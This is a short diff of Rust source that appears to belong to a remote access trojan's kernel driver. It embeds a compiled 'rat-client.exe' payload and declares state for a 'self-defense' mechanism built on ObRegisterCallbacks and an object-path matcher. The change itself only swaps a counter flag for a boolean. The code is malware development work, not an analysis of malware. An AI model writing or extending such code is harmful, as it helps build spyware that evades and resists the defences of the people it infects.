@@ -1,6 +1,6 @@
 use core::ffi::c_void;
 use core::ptr;
-use core::sync::atomic::{AtomicBool, AtomicI64, AtomicPtr, AtomicU32};
+use core::sync::atomic::{AtomicBool, AtomicI64, AtomicPtr};
 
 use aho_corasick::AhoCorasick;
 use const_format::formatcp;
@@ -45,7 +45,7 @@ pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe"
 #[cfg(not(debug_assertions))]
 pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");
 
-pub static RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG: AtomicU32 = AtomicU32::new(0);
+pub static SELF_DEFENSE_ACTIVATED: AtomicBool = AtomicBool::new(false);
 
 pub static OBJ_PATH_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::null_mut());
 pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
